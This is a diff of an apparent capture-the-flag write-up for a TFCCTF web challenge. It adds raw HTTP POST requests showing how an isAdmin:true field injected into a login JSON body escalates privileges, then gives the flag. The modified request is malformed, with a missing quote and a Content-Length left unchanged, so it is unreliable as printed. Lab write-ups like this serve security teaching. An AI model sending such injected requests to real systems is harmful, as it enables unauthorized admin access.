@@ -136,10 +136,42 @@ With the Burp Suite tool, I will modify the POST request to add `isAdmin` value 
 
 Default POST request:
 
-Image
+```
+POST /api/auth HTTP/1.1
+Host: 01.linux.challenges.ctf.thefewchosen.com:49374
+Content-Length: 23
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://01.linux.challenges.ctf.thefewchosen.com:49374
+Referer: http://01.linux.challenges.ctf.thefewchosen.com:49374/
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+{"username":"Sanlokii"}
+```
 
 Modified POST request:
 
-Image
+```
+POST /api/auth HTTP/1.1
+Host: 01.linux.challenges.ctf.thefewchosen.com:49374
+Content-Length: 23
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://01.linux.challenges.ctf.thefewchosen.com:49374
+Referer: http://01.linux.challenges.ctf.thefewchosen.com:49374/
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+{"username":"Sanlokii","isAdmin:true}
+```
+
+The website get back :
+
+![image](https://user-images.githubusercontent.com/49941629/182031839-013d5fe2-da5f-42e3-9a4e-9beba9a4e190.png)
 
 Flag: TFCCTF{S4n1t1z3_Y0ur_1nput5!}
